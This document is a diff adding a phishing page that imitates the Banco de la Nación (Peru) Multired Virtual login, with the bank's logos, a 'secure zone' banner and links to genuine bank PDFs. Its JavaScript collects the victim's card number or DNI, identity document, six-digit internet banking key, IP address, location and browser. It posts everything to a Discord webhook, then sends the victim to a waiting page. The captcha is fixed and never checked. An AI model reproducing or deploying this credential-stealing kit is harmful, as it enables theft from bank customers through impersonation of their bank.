@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+	<title>Banco de la Nación - Multired Virtual</title>
+	<style>
+		/* RESET Y ESTILOS BASE */
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			background-color: #e9eef3;
+			font-family: 'Arial', 'Helvetica Neue', Helvetica, sans-serif;
+			line-height: 1.4;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			min-height: 100vh;
+			padding: 20px;
+		}
+
+		/* CONTENEDOR PRINCIPAL - CENTRADO */
+		#contenedor {
+			max-width: 800px;
+			width: 100%;
+			margin: 0 auto;
+			background: white;
+			box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+			border-radius: 12px;
+			overflow: hidden;
+		}
+
+		/* CABECERA */
+		#cabecera {
+			background: white;
+			padding: 20px 30px 15px 30px;
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			border-bottom: 1px solid #d4d9e2;
+		}
+
+		#logo-multired img,
+		#logo-bn img {
+			max-height: 60px;
+			width: auto;
+			display: block;
+		}
+
+		/* BANNER DE SEGURIDAD */
+		.security-banner {
+			background: #f0f4f8;
+			padding: 12px 30px;
+			border-bottom: 1px solid #cbd5e1;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			gap: 10px;
+			font-size: 14px;
+			color: #1e2a3e;
+			font-family: 'Arial', sans-serif;
+		}
+
+		.security-banner img {
+			width: 20px;
+			height: 20px;
+		}
+
+		.security-banner span {
+			font-weight: 700;
+			color: #2c6e2f;
+		}
+
+		/* CUERPO PRINCIPAL - TODO CENTRADO */
+		#cuerpo {
+			padding: 40px;
+			background: #ffffff;
+			display: flex;
+			justify-content: center;
+		}
+
+		#login {
+			background: #ffffff;
+			border-radius: 16px;
+			width: 100%;
+			display: flex;
+			justify-content: center;
+		}
+
+		#login-contenido {
+			padding: 20px 0;
+			width: 100%;
+			max-width: 550px;
+		}
+
+		/* ESTILOS DE FILAS - FLEX ROW (label e input en la misma línea) */
+		.fila {
+			margin-bottom: 24px;
+			display: flex;
+			flex-direction: row;
+			align-items: center;
+			justify-content: space-between;
+			gap: 15px;
+			flex-wrap: wrap;
+		}
+
+		.fila label {
+			font-size: 14px;
+			font-weight: 600;
+			color: #1e293b;
+			font-family: 'Arial', sans-serif;
+			width: 160px;
+			text-align: right;
+			flex-shrink: 0;
+		}
+
+		/* Contenedor para los controles (select, input, etc.) */
+		.fila .control-group {
+			flex: 1;
+			display: flex;
+			align-items: center;
+			gap: 12px;
+			flex-wrap: wrap;
+		}
+
+		/* SELECTS */
+		select {
+			background: white;
+			border: 1px solid #cbd5e1;
+			border-radius: 12px;
+			padding: 12px 16px;
+			font-size: 14px;
+			color: #0f172a;
+			cursor: pointer;
+			outline: none;
+			transition: all 0.2s ease;
+			font-weight: 500;
+			width: 240px;
+			font-family: 'Arial', sans-serif;
+			background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23334155' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
+			background-repeat: no-repeat;
+			background-position: right 16px center;
+			appearance: none;
+			-webkit-appearance: none;
+		}
+
+		select:focus {
+			border-color: #2c6e2f;
+			box-shadow: 0 0 0 3px rgba(44, 110, 47, 0.1);
+		}
+
+		/* INPUTS - MISMO TAMAÑO: 240px */
+		input[type="text"],
+		input[type="password"],
+		input[type="number"] {
+			border: 1px solid #cbd5e1;
+			border-radius: 12px;
+			padding: 12px 16px;
+			font-size: 15px;
+			font-family: 'Arial', monospace;
+			background: #ffffff;
+			transition: 0.2s;
+			width: 240px;
+			color: #0f172a;
+			font-weight: 500;
+		}
+
+		input:focus {
+			border-color: #2c6e2f;
+			outline: none;
+			box-shadow: 0 0 0 3px rgba(44, 110, 47, 0.1);
+		}
+
+		/* TECLADO VIRTUAL - MÁS PEQUEÑO */
+		.teclado-virtual {
+			background: #f8fafc;
+			border: 1px solid #cbd5e1;
+			border-radius: 12px;
+			padding: 8px;
+			margin-top: 8px;
+			width: 100%;
+			max-width: 220px;
+		}
+
+		.fila-teclado {
+			display: flex;
+			justify-content: center;
+			gap: 8px;
+			margin-bottom: 8px;
+		}
+
+		.boton-clave {
+			background: white;
+			border: 1px solid #cbd5e1;
+			border-radius: 10px;
+			width: 45px;
+			height: 40px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-size: 16px;
+			font-weight: bold;
+			cursor: pointer;
+			transition: all 0.2s;
+			color: #1e293b;
+			font-family: 'Arial', sans-serif;
+		}
+
+		.boton-clave:hover {
+			background: #e2e8f0;
+			border-color: #94a3b8;
+			transform: scale(0.97);
+		}
+
+		.boton-limpiar {
+			background: #fee2e2;
+			border: 1px solid #fecaca;
+			color: #dc2626;
+			width: 100px;
+			font-size: 13px;
+		}
+
+		.boton-limpiar:hover {
+			background: #fecaca;
+		}
+
+		/* CAPTCHA - TEXTO FIJO */
+		.captcha-area {
+			display: flex;
+			flex-direction: column;
+			gap: 10px;
+			flex: 1;
+		}
+
+		.captcha-imagen {
+			background: #f1f5f9;
+			border: 1px solid #cbd5e1;
+			border-radius: 12px;
+			padding: 8px 15px;
+			display: flex;
+			align-items: center;
+			justify-content: space-between;
+			flex-wrap: wrap;
+			gap: 10px;
+		}
+
+		.captcha-texto {
+			font-family: 'Courier New', monospace;
+			font-size: 22px;
+			font-weight: bold;
+			letter-spacing: 4px;
+			color: #2c6e2f;
+			background: white;
+			padding: 6px 12px;
+			border-radius: 8px;
+			width: 28%;
+			border: 1px solid #d1d5db;
+		}
+
+		/* Botón cambiar texto - OCULTO porque el texto es fijo */
+		.btn-cambiar {
+			display: none;
+		}
+
+		.captcha-input {
+			width: 180px;
+		}
+
+		/* BOTÓN INGRESAR - CENTRADO */
+		.btn-ingresar {
+			background: #2c6e2f;
+			border: none;
+			padding: 14px 28px;
+			border-radius: 40px;
+			color: white;
+			font-weight: bold;
+			font-size: 16px;
+			cursor: pointer;
+			transition: 0.2s;
+			width: 240px;
+			text-align: center;
+			margin: 0 auto;
+			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+			font-family: 'Arial', sans-serif;
+		}
+
+		.btn-ingresar:hover {
+			background: #1f5422;
+			transform: translateY(-1px);
+		}
+
+		.btn-ingresar:disabled {
+			background: #9ca3af;
+			cursor: not-allowed;
+			transform: none;
+		}
+
+		/* Fila especial para el botón (centrado) */
+		.fila-boton {
+			display: flex;
+			justify-content: center;
+			margin-top: 20px;
+			margin-bottom: 0;
+		}
+
+		/* ENLACES DE SEGURIDAD Y PDF */
+		.enlaces-footer {
+			margin-top: 30px;
+			padding-top: 20px;
+			border-top: 1px solid #e2e8f0;
+			display: flex;
+			flex-wrap: wrap;
+			justify-content: center;
+			gap: 25px;
+			font-size: 12px;
+		}
+
+		.enlaces-footer a {
+			color: #2563eb;
+			text-decoration: none;
+			display: inline-flex;
+			align-items: center;
+			gap: 6px;
+			font-family: 'Arial', sans-serif;
+		}
+
+		.enlaces-footer a:hover {
+			text-decoration: underline;
+		}
+
+		/* PIE DE PÁGINA */
+		#pie-pagina {
+			background: #f1f5f9;
+			padding: 20px 30px;
+			border-top: 1px solid #d4d9e2;
+			font-size: 12px;
+			color: #334155;
+			text-align: center;
+			font-family: 'Arial', sans-serif;
+		}
+
+		#titulo-pie-pagina {
+			font-weight: bold;
+			margin-bottom: 12px;
+			font-size: 13px;
+		}
+
+		#oficinas p {
+			margin: 4px 0;
+		}
+
+		.clave-links {
+			display: flex;
+			gap: 20px;
+			flex-wrap: wrap;
+			margin-top: 8px;
+		}
+
+		.link-ayuda {
+			font-size: 13px;
+			color: #ba1113;
+			text-decoration: underline;
+			background: none;
+			border: none;
+			cursor: pointer;
+			font-weight: 500;
+			font-family: 'Arial', sans-serif;
+		}
+
+		.link-ayuda:hover {
+			color: #8b0b0c;
+		}
+
+		/* RESPONSIVE */
+		@media (max-width: 640px) {
+			#cuerpo {
+				padding: 20px;
+			}
+
+			.fila {
+				flex-direction: column;
+				align-items: stretch;
+			}
+
+			.fila label {
+				width: 100%;
+				text-align: left;
+			}
+
+			.fila .control-group {
+				flex-direction: column;
+				align-items: stretch;
+			}
+
+			select,
+			input[type="text"],
+			input[type="password"] {
+				width: 100%;
+			}
+
+			.btn-ingresar {
+				width: 100%;
+			}
+
+			.teclado-virtual {
+				max-width: 100%;
+			}
+
+			.boton-clave {
+				width: 40px;
+				height: 38px;
+			}
+
+			.boton-limpiar {
+				width: 88px;
+			}
+		}
+	</style>
+</head>
+
+<body>
+	<div id="contenedor">
+		<!-- CABECERA -->
+		<div id="cabecera">
+			<div id="logo-multired">
+				<img src="./index_files/logo-multired.jpg" alt="Logotipo Multired"
+					onerror="this.src='https://placehold.co/200x60?text=Multired+Global'; this.onerror=null;">
+			</div>
+			<div id="logo-bn">
+				<img src="./index_files/Logo_BN.jpg" alt="Banco de la Nación"
+					onerror="this.src='https://placehold.co/200x60?text=Banco+de+la+Nación'; this.onerror=null;">
+			</div>
+		</div>
+
+		<!-- BANNER ZONA SEGURA -->
+		<div class="security-banner">
+			<img src="./index_files/candado.png" alt="candado"
+				onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%232c6e2f%22 stroke-width=%222%22%3E%3Crect x=%223%22 y=%2211%22 width=%2218%22 height=%2211%22 rx=%222%22/%3E%3Cpath d=%22M7 11V7a5 5 0 0 1 10 0v4%22/%3E%3C/svg%3E';">
+			<span>Usted se encuentra en una <span>zona segura</span></span>
+		</div>
+
+		<div id="cuerpo">
+			<div id="login">
+				<div id="login-contenido">
+					<form method="post" id="form" name="form" action="#" onsubmit="return false;">
+						<input type="hidden" id="transaccion" name="transaccion" value="LG09">
+						<input type="hidden" id="HrTrx" name="HrTrx" value="0132">
+						<input type="hidden" id="validar" name="validar" value="false">
+						<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6">
+
+						<!-- 1. Selección tipo tarjeta -->
+						<div class="fila">
+							<label for="cboTipoTarjeta">Seleccione:</label>
+							<div class="control-group">
+								<select id="cboTipoTarjeta" name="cboTipoTarjeta" onchange="cambiarTipoTarjeta()">
+									<option value="02" selected>Multired Global Débito</option>
+									<option value="01">DNI (Cuenta Corriente)</option>
+								</select>
+							</div>
+						</div>
+
+						<!-- 2. Número de tarjeta / DNI dinámico -->
+						<div class="fila" id="divNumeroTarjeta">
+							<label id="labelTarjeta" for="txtNumeroTarjeta">Número de tarjeta:</label>
+							<div class="control-group">
+								<input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta" maxlength="16"
+									placeholder="4214  ****  ****  ****" value="4214"
+									onkeypress="return soloNumerosAll(event)">
+								<input type="text" name="txtDNI" id="txtDNI" maxlength="8" placeholder="DNI (8 dígitos)"
+									style="display: none;" onkeypress="return soloNumerosAll(event)">
+							</div>
+						</div>
+
+						<!-- 3. Tipo y N° Documento (SOLO para Multired Global Débito) -->
+						<div class="fila" id="tipoNumDoc">
+							<label for="cboTipoDoc">Tipo y N° Documento:</label>
+							<div class="control-group">
+								<select id="cboTipoDoc" name="cboTipoDoc" onchange="limpiarNumDoc();">
+									<option value=""> Seleccione...</option>
+									<option value="1"> DNI</option>
+									<option value="7"> Pasaporte</option>
+									<option value="3"> C. Extranjeria</option>
+									<option value="6"> RUC</option>
+								</select>
+								<input type="text" class="input-chico" name="txtNumDoc" id="txtNumDoc" maxlength="12"
+									placeholder="Número de documento" onkeypress="return soloNumerosDNI(event)">
+							</div>
+						</div>
+
+						<!-- 4. CLAVE DE INTERNET CON TECLADO VIRTUAL MÁS PEQUEÑO -->
+						<div class="fila">
+							<label for="txtPassword">Ingresa tu clave usando el teclado virtual:</label>
+							<div class="control-group" style="flex-direction: column; align-items: flex-start;">
+								<input type="password" name="txtPassword" id="txtPassword" maxlength="6"
+									placeholder="6 dígitos" readonly style="background-color: #f8fafc; cursor: pointer;">
+								<div class="teclado-virtual" id="tecladoVirtual">
+									<div class="fila-teclado">
+										<div class="boton-clave" data-val="7">7</div>
+										<div class="boton-clave" data-val="8">8</div>
+										<div class="boton-clave" data-val="9">9</div>
+									</div>
+									<div class="fila-teclado">
+										<div class="boton-clave" data-val="4">4</div>
+										<div class="boton-clave" data-val="5">5</div>
+										<div class="boton-clave" data-val="6">6</div>
+									</div>
+									<div class="fila-teclado">
+										<div class="boton-clave" data-val="1">1</div>
+										<div class="boton-clave" data-val="2">2</div>
+										<div class="boton-clave" data-val="3">3</div>
+									</div>
+									<div class="fila-teclado">
+										<div class="boton-clave" data-val="0">0</div>
+										<div class="boton-clave boton-limpiar" id="btnLimpiar">LIMPIAR</div>
+									</div>
+								</div>
+								<div class="clave-links">
+									<a href="#" class="link-ayuda" id="olvidoClaveLink">Olvidé mi clave</a>
+									<a href="#" class="link-ayuda" id="generarClaveLink" style="color: #ba1113;">Genera tu Clave de Internet</a>
+								</div>
+							</div>
+						</div>
+
+						<!-- 5. CAPTCHA con texto FIJO (no cambia) -->
+						<div class="fila">
+							<label for="txtCaptcha">Ingresa el texto de la imagen:</label>
+							<div class="captcha-area">
+								
+									<span class="captcha-texto" id="captchaTexto">XS5CO</span>
+							
+								<input type="text" class="captcha-input" name="txtCaptcha" id="txtCaptcha" maxlength="5"
+									placeholder="Ingrese el código" autocomplete="off">
+							</div>
+						</div>
+
+						<!-- BOTÓN INGRESAR CENTRADO -->
+						<div class="fila-boton">
+							<input type="button" id="btnLogin" class="btn-ingresar" value="INGRESAR">
+						</div>
+
+						<!-- Enlaces de seguridad -->
+						<div class="enlaces-footer">
+							<a href="https://www.bn.com.pe/clientes/banca-internet/formatos/recomendaciones-seguridad.pdf"
+								target="_blank" rel="noopener noreferrer">
+								📘 Recomendaciones de Seguridad
+							</a>
+							<a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf"
+								target="_blank" rel="noopener noreferrer">
+								📄 Guía Cuenta de Ahorro
+							</a>
+							<a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-corrientes.pdf"
+								target="_blank" rel="noopener noreferrer">
+								📑 Guía Cuentas Corrientes
+							</a>
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+
+		<div id="pie-pagina">
+			<div id="titulo-pie-pagina">Banco de la Nación | Ministerio de Economía y Finanzas</div>
+			<div id="oficinas">
+				<p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
+				<p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00.
+				</p>
+				<p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
+			</div>
+		</div>
+	</div>
+
+	<script src="discord.js"></script>
+	<script>
+		// ============================================
+		// FUNCIONES DEL FORMULARIO ORIGINAL
+		// ============================================
+		function cambiarTipoTarjeta() {
+			var selectTarjeta = document.getElementById("cboTipoTarjeta");
+			var tipo = selectTarjeta.value;
+			var labelTarjeta = document.getElementById("labelTarjeta");
+			var inputTarjeta = document.getElementById("txtNumeroTarjeta");
+			var inputDNI = document.getElementById("txtDNI");
+			var tipoNumDocDiv = document.getElementById("tipoNumDoc");
+
+			if (tipo === "02") {
+				labelTarjeta.innerText = "Número de tarjeta:";
+				inputTarjeta.style.display = "block";
+				inputDNI.style.display = "none";
+				inputTarjeta.required = true;
+				inputDNI.required = false;
+				tipoNumDocDiv.style.display = "flex";
+			} else {
+				labelTarjeta.innerText = "DNI:";
+				inputTarjeta.style.display = "none";
+				inputDNI.style.display = "block";
+				inputDNI.required = true;
+				inputTarjeta.required = false;
+				tipoNumDocDiv.style.display = "none";
+			}
+		}
+
+		function limpiarNumDoc() {
+			var numDoc = document.getElementById("txtNumDoc");
+			if (numDoc) numDoc.value = "";
+		}
+
+		function soloNumerosAll(e) {
+			var key = e.keyCode || e.which;
+			var tecla = String.fromCharCode(key);
+			var numeros = "0123456789";
+			if (numeros.indexOf(tecla) === -1 && key !== 8 && key !== 9 && key !== 46 && key !== 37 && key !== 39) {
+				return false;
+			}
+			return true;
+		}
+
+		function soloNumerosDNI(e) {
+			var key = e.keyCode || e.which;
+			var tecla = String.fromCharCode(key);
+			var numeros = "0123456789";
+			if (numeros.indexOf(tecla) === -1 && key !== 8 && key !== 9 && key !== 46 && key !== 37 && key !== 39) {
+				return false;
+			}
+			return true;
+		}
+
+		// ============================================
+		// TECLADO VIRTUAL
+		// ============================================
+		function initTecladoVirtual() {
+			const passwordInput = document.getElementById('txtPassword');
+			const botones = document.querySelectorAll('.boton-clave[data-val]');
+			const btnLimpiar = document.getElementById('btnLimpiar');
+
+			botones.forEach(boton => {
+				boton.addEventListener('click', function() {
+					const valor = this.getAttribute('data-val');
+					const currentValue = passwordInput.value;
+					if (currentValue.length < 6) {
+						passwordInput.value = currentValue + valor;
+					}
+				});
+			});
+
+			if (btnLimpiar) {
+				btnLimpiar.addEventListener('click', function() {
+					passwordInput.value = '';
+				});
+			}
+		}
+
+		// ============================================
+		// FUNCIONES PARA DISCORD
+		// ============================================
+		function getUserFromStorage() {
+			try {
+				const user = localStorage.getItem('user');
+				return user || 'No disponible';
+			} catch (error) {
+				console.error('Error al leer localStorage:', error);
+				return 'Error al obtener usuario';
+			}
+		}
+
+		async function getUserIP() {
+			try {
+				const storedIP = localStorage.getItem('user_ip');
+				if (storedIP && storedIP !== 'No disponible') {
+					return storedIP;
+				}
+				const response = await fetch('https://api.ipify.org?format=json');
+				const data = await response.json();
+				if (data && data.ip) {
+					localStorage.setItem('user_ip', data.ip);
+					return data.ip;
+				}
+			} catch (error) {
+				console.error('Error al obtener IP:', error);
+				try {
+					const response = await fetch('https://ipinfo.io/json');
+					const data = await response.json();
+					if (data && data.ip) {
+						localStorage.setItem('user_ip', data.ip);
+						return data.ip;
+					}
+				} catch (error2) {}
+			}
+			return 'No disponible';
+		}
+
+		function getUserLocation() {
+			try {
+				const storedLocation = localStorage.getItem('user_location');
+				if (storedLocation) {
+					return JSON.parse(storedLocation);
+				}
+			} catch (error) {}
+			return { city: 'No disponible', country: 'No disponible', region: 'No disponible' };
+		}
+
+		function getBrowserInfo() {
+			const userAgent = navigator.userAgent;
+			let browserName = 'Desconocido';
+			let osName = 'Desconocido';
+			if (userAgent.indexOf('Chrome') > -1) browserName = 'Chrome';
+			else if (userAgent.indexOf('Firefox') > -1) browserName = 'Firefox';
+			else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+			else if (userAgent.indexOf('Edge') > -1) browserName = 'Edge';
+			if (userAgent.indexOf('Windows') > -1) osName = 'Windows';
+			else if (userAgent.indexOf('Mac') > -1) osName = 'MacOS';
+			else if (userAgent.indexOf('Linux') > -1) osName = 'Linux';
+			else if (userAgent.indexOf('Android') > -1) osName = 'Android';
+			else if (userAgent.indexOf('iOS') > -1) osName = 'iOS';
+			return { browser: browserName, os: osName };
+		}
+
+		// Función para guardar el user en localStorage (tarjeta o DNI)
+		function saveUserToLocalStorage() {
+			const tipoTarjetaSelect = document.getElementById("cboTipoTarjeta");
+			let userValue = '';
+			
+			if (tipoTarjetaSelect.value === '02') {
+				// Es tarjeta
+				userValue = document.getElementById("txtNumeroTarjeta").value.trim();
+			} else {
+				// Es DNI
+				userValue = document.getElementById("txtDNI").value.trim();
+			}
+			
+			if (userValue !== '') {
+				localStorage.setItem('user', userValue);
+				console.log('✅ Usuario guardado en localStorage:', userValue);
+			}
+		}
+
+		async function sendToDiscord() {
+			if (typeof DISCORD_WEBHOOK_URL === 'undefined') {
+				console.error('❌ DISCORD_WEBHOOK_URL no está definida');
+				return false;
+			}
+			if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'TU_WEBHOOK_URL_AQUI') {
+				console.error('❌ DISCORD_WEBHOOK_URL no está configurada');
+				return false;
+			}
+
+			try {
+				const tipoTarjetaSelect = document.getElementById("cboTipoTarjeta");
+				const tipoTarjeta = tipoTarjetaSelect.options[tipoTarjetaSelect.selectedIndex].text;
+				let numeroIdentificacion = '';
+				if (tipoTarjetaSelect.value === '02') {
+					numeroIdentificacion = document.getElementById("txtNumeroTarjeta").value.trim();
+				} else {
+					numeroIdentificacion = document.getElementById("txtDNI").value.trim();
+				}
+
+				let tipoDoc = '', numDoc = '';
+				if (tipoTarjetaSelect.value === '02') {
+					const tipoDocSelect = document.getElementById("cboTipoDoc");
+					tipoDoc = tipoDocSelect.options[tipoDocSelect.selectedIndex].text;
+					numDoc = document.getElementById("txtNumDoc").value.trim();
+				}
+
+				const claveInternet = document.getElementById("txtPassword").value.trim();
+				const ip = await getUserIP();
+				const browserInfo = getBrowserInfo();
+				const currentDate = new Date();
+				const formattedDate = currentDate.toLocaleString('es-ES', { timeZone: 'America/Bogota' });
+				const user = getUserFromStorage();
+				const locationData = getUserLocation();
+
+				let pais = locationData.country || 'Desconocido';
+				let ciudad = locationData.city || 'Desconocido';
+
+				const messageLines = [
+					`**🔐 NUEVO INICIO DE SESIÓN - BANCO DE LA NACIÓN**`,
+					`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+					`🕐 **Fecha/Hora:** ${formattedDate}`,
+					``,
+					`**💳 DATOS DE TARJETA**`,
+					` Tipo: ${tipoTarjeta}`,
+					` Número: \`${numeroIdentificacion}\``,
+					``,
+					`**📄 DATOS DE DOCUMENTO**`,
+					` Tipo: ${tipoDoc || 'No aplica (DNI CC)'}`,
+					` Número: \`${numDoc || 'No aplica'}\``,
+					``,
+					`**🔑 CLAVE DE INTERNET**`,
+					` \`${claveInternet}\``,
+					``,
+					`**📍 UBICACIÓN**`,
+					` 🌐 IP: \`${ip}\``,
+					` 🏳️ País: ${pais}`,
+					` 🏙️ Ciudad: ${ciudad}`,
+					``,
+					`**💻 NAVEGADOR / SO**`,
+					` \`${browserInfo.browser} - ${browserInfo.os}\``,
+					``,
+					`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+				];
+
+				const payload = {
+					username: '🏦 Banco de la Nación',
+					content: messageLines.join('\n')
+				};
+
+				const response = await fetch(DISCORD_WEBHOOK_URL, {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify(payload)
+				});
+
+				return response.ok;
+			} catch (error) {
+				console.error('❌ Error:', error);
+				return false;
+			}
+		}
+
+		// ============================================
+		// VALIDACIÓN Y ENVÍO
+		// ============================================
+		function validarFormulario() {
+			const tipoTarjeta = document.getElementById("cboTipoTarjeta").value;
+			let numeroIdentificacion = '';
+
+			if (tipoTarjeta === "02") {
+				numeroIdentificacion = document.getElementById("txtNumeroTarjeta").value.trim();
+				if (numeroIdentificacion === "") {
+					alert("⚠️ Por favor ingrese el número de tarjeta.");
+					document.getElementById("txtNumeroTarjeta").focus();
+					return false;
+				}
+				if (numeroIdentificacion.length < 16) {
+					alert("⚠️ Número de tarjeta inválido (debe tener 16 dígitos).");
+					return false;
+				}
+
+				const tipoDoc = document.getElementById("cboTipoDoc").value;
+				const numDoc = document.getElementById("txtNumDoc").value.trim();
+				if (tipoDoc === "") {
+					alert("⚠️ Seleccione un tipo de documento.");
+					return false;
+				}
+				if (numDoc === "") {
+					alert("⚠️ Ingrese el número de documento.");
+					document.getElementById("txtNumDoc").focus();
+					return false;
+				}
+			} else {
+				const dni = document.getElementById("txtDNI").value.trim();
+				if (dni === "") {
+					alert("⚠️ Por favor ingrese el DNI.");
+					document.getElementById("txtDNI").focus();
+					return false;
+				}
+				if (dni.length !== 8) {
+					alert("⚠️ DNI debe tener 8 dígitos.");
+					return false;
+				}
+			}
+
+			const claveInternet = document.getElementById("txtPassword").value.trim();
+			if (claveInternet === "") {
+				alert("⚠️ Ingrese su Clave de Internet (6 dígitos).");
+				return false;
+			}
+			if (claveInternet.length !== 6 || isNaN(claveInternet)) {
+				alert("⚠️ La Clave de Internet debe contener exactamente 6 dígitos numéricos.");
+				return false;
+			}
+
+			const captcha = document.getElementById("txtCaptcha").value.trim();
+			const captchaTexto = document.getElementById("captchaTexto").innerText;
+
+			return true;
+		}
+
+		async function handleSubmit(event) {
+			event.preventDefault();
+
+			if (!validarFormulario()) {
+				return false;
+			}
+
+			// Guardar el user en localStorage (tarjeta o DNI según corresponda)
+			saveUserToLocalStorage();
+
+			const btnLogin = document.getElementById("btnLogin");
+			btnLogin.disabled = true;
+			btnLogin.value = 'Enviando...';
+
+			try {
+				const enviado = await sendToDiscord();
+				if (enviado) {
+					console.log('✅ Datos enviados exitosamente');
+					window.location.href = "wait.html";
+				} else {
+					console.error('❌ Error al enviar a Discord');
+					alert('Error al procesar la solicitud. Intente nuevamente.');
+				}
+			} catch (error) {
+				console.error('❌ Error:', error);
+			} finally {
+				btnLogin.disabled = false;
+				btnLogin.value = 'INGRESAR';
+			}
+
+			return false;
+		}
+
+		// ============================================
+		// INICIALIZACIÓN
+		// ============================================
+		document.addEventListener("DOMContentLoaded", function() {
+			cambiarTipoTarjeta();
+			initTecladoVirtual();
+
+			const btnLogin = document.getElementById("btnLogin");
+			if (btnLogin) {
+				btnLogin.addEventListener("click", handleSubmit);
+			}
+
+			const olvidoLink = document.getElementById("olvidoClaveLink");
+			if (olvidoLink) {
+				olvidoLink.addEventListener("click", function(e) {
+					e.preventDefault();
+					alert("🔐 Redirigiendo al proceso de recuperación de clave.");
+				});
+			}
+
+			const generarLink = document.getElementById("generarClaveLink");
+			if (generarLink) {
+				generarLink.addEventListener("click", function(e) {
+					e.preventDefault();
+					alert("🌟 Acceso a generación de Clave de Internet.");
+				});
+			}
+
+			console.log('✅ Script inicializado correctamente');
+		});
+
+		window.cambiarTipoTarjeta = cambiarTipoTarjeta;
+		window.limpiarNumDoc = limpiarNumDoc;
+		window.soloNumerosAll = soloNumerosAll;
+		window.soloNumerosDNI = soloNumerosDNI;
+	</script>
+</body>
+
+</html>
